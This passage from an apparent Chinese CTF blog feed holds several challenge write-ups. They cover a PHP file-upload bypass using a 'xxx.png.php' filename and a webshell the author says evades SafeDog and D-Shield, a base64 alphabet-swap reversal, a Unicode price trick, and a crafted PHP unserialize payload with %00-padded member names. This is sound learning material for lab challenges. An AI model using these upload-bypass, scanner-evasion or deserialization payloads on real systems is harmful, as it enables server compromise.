fun()，返回post中“a”的数据。我的这个例子很明显是一句话木马，但是安全狗却扫不出，D盾也是如此。</p><hr><p>上传写好的一句话，并且抓包修改后缀为php，发现返回错误：<br><img src="/images/ezup5.JPG"><br>这里的提示和之前的不一样，说明我们绕过了前端，但没有绕过后端的验证</p><h1 id="找到突破口"><a href="#找到突破口" class="headerlink" title="找到突破口"></a>找到突破口</h1><p>观察包数据，发现上传文件需要post请求一个根目录下的upload.php文件，我们直接访问，发现源代码泄露，直接给出了upload.php的源码，泄露了后端验证的过程，以下给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$targetDir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"><span class="variable">$allowedExtensions</span> = [<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp_path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>] !== <span class="string">&#x27;image/png&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件类型不符合要求&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">filesize</span>(<span class="variable">$tmp_path</span>) &gt; <span class="number">512</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件太大&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fileName</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$fileNameParts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$fileNameParts</span>) &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$secondSegment</span> = <span class="variable">$fileNameParts</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$secondSegment</span> !== <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$uploadFilePath</span> = <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$targetDir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_path</span>, <span class="variable">$uploadFilePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;file_path&#x27;</span> =&gt; <span class="variable">$uploadFilePath</span>]));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件上传失败&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计代码发现，程序逻辑是将上传文件的文件名以 “.” 来分割并返回一个列表，然后判断这个列表的第二项是否为png，如果是则通过，如果不是则不通过。那么思路就来了，因为只有最后一个点才会被识别为后缀，但是程序却判断不是列表的最后一项，那么我们只需要构造形如”xxx.png.php”的文件名就可以成功将php木马上传。</p><h1 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h1><p>先上传一个png文件，再通过抓包修改后缀，上传成功并返回地址：<br><img src="/images/ezup6.JPG"><br>然后用蚁剑回连（蚁剑工具在github可以下载），连接后再根目录找到flag：<br><img src="/images/ezupflag.JPG"></p><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.一定要注意观察数据包的内容，有时一个小小的请求地址，有可能会泄露重要的代码</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reverse-base64</title>
      <link href="/2023/09/28/moebase64/"/>
      <url>/2023/09/28/moebase64/</url>
      
        <content type="html"><![CDATA[<h1 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h1><p>题目给了一个pyc文件，我们尝试在线反编译后获得源文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># Version: Python 3.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line">str1 = <span class="string">&#x27;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&#x27;</span></span><br><span class="line">string1 = <span class="string">&#x27;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&#x27;</span></span><br><span class="line">string2 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;welcome to moectf\ninput your flag and I wiil check it:&#x27;</span>)</span><br><span class="line">enc_flag = base64.b64encode(flag.encode()).decode()</span><br><span class="line">enc_flag = enc_flag.translate(<span class="built_in">str</span>.maketrans(string2, string1))</span><br><span class="line"><span class="keyword">if</span> enc_flag == str1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;good job!!!!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;something wrong???&#x27;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="分析加密"><a href="#分析加密" class="headerlink" title="分析加密"></a>分析加密</h1><p>审计程序逻辑发现，程序的具体逻辑是，我们输入一个字符串，然后程序对这个字符串进行base64编码，然后通过某个映射加密这组字符串，然后将这组字符串和str1对比，如果相同即为flag，所以str1这个变量即是加密后的flag，我们需要对str1进行逆向。<br>我们要反向映射str1这个字符串，查找发现，maketrans函数的作用是创建一个将string1用string2替换的映射表，而maketrans就是使用这个映射表处理字符串。那么转念一想，我们反向映射，只要将函数中string1和string2的位置交换，创建一个将string2用string1来替换的映射表，再用这个新的映射表来处理str1，不就反映射成功了吗？</p><h1 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h1><p>说干就干，修改了以下题目的py脚本，反向映射str1，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line">str1 = <span class="string">&#x27;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&#x27;</span></span><br><span class="line">string1 = <span class="string">&#x27;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&#x27;</span></span><br><span class="line">string2 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">f=str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))</span><br><span class="line"><span class="built_in">print</span>(f)</span><br></pre></td></tr></table></figure><p>运行得到反映射结果：<br><img src="/images/repy1.JPG"><br>再使用base64解码，得到flag：<br><img src="/images/repyflag.JPG"></p><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.要熟悉程序的函数，使用逆向思维分析</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web-Unicode</title>
      <link href="/2023/09/07/dgctf2/"/>
      <url>/2023/09/07/dgctf2/</url>
      
        <content type="html"><![CDATA[<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p><img src="/images/dgutctfuni1.JPG"><br>大致就是一个“买”unicorn的商店，尝试购买，发现价格处只能填写一个字符，并且最后一个商品要1337四位数的价格，显然，题目要求我们使用一个字符来购买这个四位数价格的商品</p><h1 id="思路简析"><a href="#思路简析" class="headerlink" title="思路简析"></a>思路简析</h1><p>我们先什么都不输入，尝试寻找报错：<br><img src="/images/dgctfuni2.JPG"><br>发现需要输入一个只占一个字符的unicode字符，那么有没有只占一个字符，但又能表示1337以上的数字的unicode字符呢？找到这样一个网站：<a href="https://www.compart.com/en/unicode">https://www.compart.com/en/unicode</a> 查到这个数值表示10000的字符：<br><img src="/images/dgctfuni3.png"><br>由于提交要使用url编码，所以把0xE1 0x8D 0xBC换成%E1%8D%BC即可</p><h1 id="拿flag"><a href="#拿flag" class="headerlink" title="拿flag"></a>拿flag</h1><p><img src="/images/dgctfflag1.JPG"><br><img src="/images/dgctfflag2.JPG"><br>得到flag</p><h1 id="反思总结"><a href="#反思总结" class="headerlink" title="反思总结"></a>反思总结</h1><p>1.有时候会遇到一些很刁钻的知识点，不懂真的做不出来</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> DgutCTF </category>
          
          <category> Web </category>
          
          <category> unicode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web-Unserialize</title>
      <link href="/2023/09/07/dgutctf1/"/>
      <url>/2023/09/07/dgutctf1/</url>
      
        <content type="html"><![CDATA[<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p><img src="/images/dgctfserial1.JPG"><br>审计代码，题目大意是让我们将username变为admin就会给flag</p><h1 id="思路过程"><a href="#思路过程" class="headerlink" title="思路过程"></a>思路过程</h1><p>我们需要传入参数，但是遇到这种改怎么传参呢？我们注意到源代码有<code>if($_GET[&#39;user&#39;])</code>这样一段，这样的代码就是php获取网址后的参数的，比方这里就是获取user的值，那么我们传参时就可以写<code>?user=需要传入的数据</code>这种结构是可以直接写在网址后面的。<br>知道了如何传参，那我们要传入什么数据呢？我们注意到，题目里有一个<code>unserialize()</code>函数，这就是反序列化函数，那什么是序列和反序列呢？以下摘录网络的解释：<br>php程序为了保存和转储对象，提供了序列化的方法。php序列化是为了在程序运行的过程中对对象进行转储而产生的。序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法。</p><p>php序列化的函数为serialize，可以将对象中的成员变量转换成字符串。</p><p>反序列化的函数为unserilize，可以将serialize生成的字符串重新还原为对象中的成员变量。</p><p>将用户可控的数据进行了反序列化，就是PHP反序列化漏洞。</p><p>序列化</p><p>序列化的目的是方便数据的传输和存储。</p><p>在PHP应用中，序列化和反序列化一般用作缓存，比如session缓存，cookie等。</p><p>常见的序列化格式：</p><pre><code>二进制格式字节数组json字符串xml字符串</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;ThisA&#x27;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&#x27;ThisB&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&#x27;ThisC&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;this is test1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">phpstudy_pro</span>\<span class="title">WWW</span>\<span class="title">s1.php</span>:11:<span class="title">string</span> &#x27;<span class="title">O</span>:4:&quot;<span class="title">Test</span>&quot;:3:&#123;<span class="title">s</span>:1:&quot;<span class="title">a</span>&quot;;<span class="title">s</span>:5:&quot;<span class="title">ThisA</span>&quot;;<span class="title">s</span>:4:&quot;�*�<span class="title">b</span>&quot;;<span class="title">s</span>:5:&quot;<span class="title">ThisB</span>&quot;;<span class="title">s</span>:7:&quot;�<span class="title">Test</span>�<span class="title">c</span>&quot;;<span class="title">s</span>:5:&quot;<span class="title">ThisC</span>&quot;;&#125;&#x27; (<span class="title">length</span>=84)</span></span><br></pre></td></tr></table></figure><p>实际的序列化字符串为</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">：O:<span class="number">4</span>:&quot;Test&quot;:<span class="number">3</span>:&#123;s:<span class="number">1</span>:&quot;a&quot;;s:<span class="number">5</span>:&quot;ThisA&quot;;s:<span class="number">4</span>:&quot;�*�b&quot;;s:<span class="number">5</span>:&quot;ThisB&quot;;s:<span class="number">7</span>:&quot;�Test�c&quot;;s:<span class="number">5</span>:&quot;ThisC&quot;;&#125;</span><br></pre></td></tr></table></figure><p>对象序列化后的结构为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">O:对象名的长度:&quot;对象名&quot;:对象属性个数:&#123;<span class="title">s</span>:属性名的长度:&quot;属性名&quot;;<span class="title">s</span>:属性值的长度:&quot;属性值&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>可以得知，序列化之后的结果是字符串string。</p><p>Test是一个类，new Test()表示创建Test类的对象。</p><p>O表示对象，4表示类的名称有4个字符，Test是类名称。</p><p>3表示对象中有3个成员变量。括号里面是每个成员的类型、名称、值。</p><p>变量名和变量值之间以分号分隔。</p><p>a是public类型的变量，s表示字符串，1表示变量名的长度，a是变量名。</p><p>b是protected类型的变量，它的变量名长度为4，也就是b前添加了%00*%00。所以，protected属性的表示方式是在变量名前加上%00*%00。</p><p>c是private类型的变量，c的变量名前添加了%00类名%00。所以，private属性的表示方式是在变量名前加上%00类名%00。</p><p>虽然Test类中有test1方法，但是，序列化得到的字符串中，只保存了公有变量a，保护变量b和私有变量c，并没保存类中的方法。也可以看出，序列化不保存方法。</p><p>反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;ThisA&#x27;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&#x27;ThisB&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&#x27;ThisC&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;this is test1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$sTest</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="variable">$usTest</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$sTest</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$usTest</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出内容如下：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">phpstudy_pro</span>\<span class="title">WWW</span>\<span class="title">s2.php</span>:13:</span></span><br><span class="line"><span class="function"><span class="title">object</span>(<span class="title">Test</span>)[2]</span></span><br><span class="line"><span class="function"><span class="title">public</span> &#x27;<span class="title">a</span>&#x27; =&gt; <span class="title">string</span> &#x27;<span class="title">ThisA</span>&#x27; (<span class="title">length</span>=5)</span></span><br><span class="line"><span class="function"><span class="title">protected</span> &#x27;<span class="title">b</span>&#x27; =&gt; <span class="title">string</span> &#x27;<span class="title">ThisB</span>&#x27; (<span class="title">length</span>=5)</span></span><br><span class="line"><span class="function"><span class="title">private</span> &#x27;<span class="title">c</span>&#x27; =&gt; <span class="title">string</span> &#x27;<span class="title">ThisC</span>&#x27; (<span class="title">length</span>=5)</span></span><br></pre></td></tr></table></figure><p>类的成员变量被还原了，但是类的方法没有被还原。因为序列化的时候就没有保存类的方法。</p><p>提炼出对题目有帮助的两点：<br>1.序列化时php表示数据的一种方式<br>2.序列化中，类名前后要加入%00即<code>%00类名%00</code><br>由题目我们可知，我们传入的数据是要经过反序列化的，所以我们要传入一个序列化了的数据，但怎么构造呢？</p><h1 id="构造序列化数据"><a href="#构造序列化数据" class="headerlink" title="构造序列化数据"></a>构造序列化数据</h1><p>你当然可以按照上面给出的格式手打payload，但我们为什么不修改以下源代码使其输出序列化的数据呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Username</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Password</span> = <span class="string">&quot;0xDktb111&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Username</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="variable">$Password</span> = <span class="string">&quot;0xDktb123&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Username == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable language_">$this</span>-&gt;Username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$user</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>根据题目意思，我们将所有的username改为admin，并且将后面直接改成给user变量赋予序列化后的数据，并输出，在kali下可以直接用<code>php -f php文件</code>来在终端中执行php脚本并输出，得到结果：<br><img src="/images/dgctfpay.JPG"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;UserUsername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;UserPassword&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;0xDktb111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>我们直接拿这个payload，在网址后面加上?user&#x3D;…….. 这样就可以了吗？显然不行，因为类名前后还要加入%00，所以最终的payload应该是这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00User%00Username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00User%00Password&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;0xDktb111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>贴在网址后面，提交参数，得到flag：<br><img src="/images/dgctfflag.JPG"></p><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.刚开始做题时不懂序列化，构造的payload有问题，导致了一些误解，总之此题admin的password没有特别要求。</p><hr><p>以下附上一些关于反序列化的知识：<br>PHP反序列化漏洞中可能会用到的魔术方法</p><p>php类可能会包含魔术方法，魔术方法命名是以符号__开头的，比如 __construct, __destruct, __toString, __sleep, __wakeup等等。这些函数在某些情况下会自动调用。</p><p>__construct():具有构造函数的类会在每次创建新对象时先调用此方法。</p><p>__destruct():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p><p>__toString()方法用于一个类被当成字符串时应怎样回应。例如echo $obj;应该显示些什么。</p><p>此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p><p>__sleep()方法在一个对象被序列化之前调用；</p><p>__wakeup():unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</p><p>__construct() # 当对象被创建时调用<br>__destruct()    # 当对象被销毁时调用<br>__toString()    # 当对象被当做字符串使用<br>__sleep()       # 在对象被序列化之前调用<br>__wakeup()  # 在对象被反序列化之前调用</p><p>现在5个魔法函数的执行顺序就明确了。</p><p>对象被创建时执行__construct。</p><p>使用serialize()序列化对象。先执行__sleep，再序列化。</p><p>unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用_wakeup()方法，预先准备对象需要的资源。</p><p>把对象当做字符串使用，比如将对象与字符串进行拼接，或者使用echo输出对象，会执行__toString</p><p>程序运行完毕，对象自动销毁，执行__destruct。</p><p>安全问题</p><p>如何利用反序列化漏洞，取决于应用程序的逻辑、可用的类和魔法函数。unserialize的参数用户可控，攻击者可以构造恶意的序列化字符串。当应用程序将恶意字符串反序列化为对象后，也就执行了攻击者指定的操作，如代码执行、任意文件读取等。</p><hr><p>2．概述</p><p>PHP 序列化后的内容是简单的文本格式，但是对字母大小写和空白（空格、回车、换行等）敏感，而且字符串是按照字节（或者说是 8 位的字符）计算的，因此，更合适的说法是 PHP 序列化后的内容是字节流格式。因此用其他语言实现时，如果所实现的语言中的字符串不是字节储存格式，而是 Unicode 储存格式的话，序列化后的内容不适合保存为字符串，而应保存为字节流对象或者字节数组，否则在与 PHP 进行数据交换时会产生错误。</p><p>PHP 对不同类型的数据用不同的字母进行标示，Yahoo 开发网站提供的Using Serialized PHP with Yahoo! Web Services 一文中给出所有的字母标示及其含义：</p><pre><code>    a - array    b - boolean    d - double    i - integer    o - common object    r - reference    s - string    C - custom object    O - class    N - null    R - pointer reference    U - unicode string</code></pre><p>N 表示的是 NULL，而 b、d、i、s 表示的是四种标量类型，目前其它语言所实现的 PHP 序列化程序基本上都实现了对这些类型的序列化和反序列化，不过有一些实现中对 s （字符串）的实现存在问题。</p><p>a、O 属于最常用的复合类型，大部分其他语言的实现都很好的实现了对 a 的序列化和反序列化，但对 O 只实现了 PHP4 中对象序列化格式，而没有提供对 PHP 5 中扩展的对象序列化格式的支持。</p><p>r、R 